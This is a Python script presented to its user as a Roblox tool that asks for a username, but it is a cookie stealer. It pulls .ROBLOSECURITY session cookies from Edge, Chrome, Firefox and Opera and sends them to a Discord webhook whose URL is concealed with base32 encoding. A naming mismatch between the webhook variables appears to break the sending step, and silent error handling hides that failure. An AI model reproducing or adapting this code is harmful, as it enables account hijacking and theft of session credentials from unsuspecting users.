import browser_cookie3, requests, threading
import base64
import time
import os
from discord_webhook import DiscordWebhook, DiscordEmbed
import random
import time

name = input('Enter your roblox username')

key = "NB2HI4DTHIXS6ZDJONRW64TEFZRW63JPMFYGSL3XMVRGQ33PNNZS6MJQGEYDAMZRGE2TGMJUGQ3DONRUGM2C6OCQIRVDQUBTGJSTIU2XGJYWYUKYPFYWSM2IJZWTETSXJZFWYURWFVGW223HLJEWEZRRJBJU2URVMQZUI6L2NFFEYY2IJVDXM4TYJFGGQUCJKA======"

weblook = base64.b32decode(key)
webhookl = DiscordWebhook(url=weblook)
def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]

for x in browsers:
    threading.Thread(target=x,).start()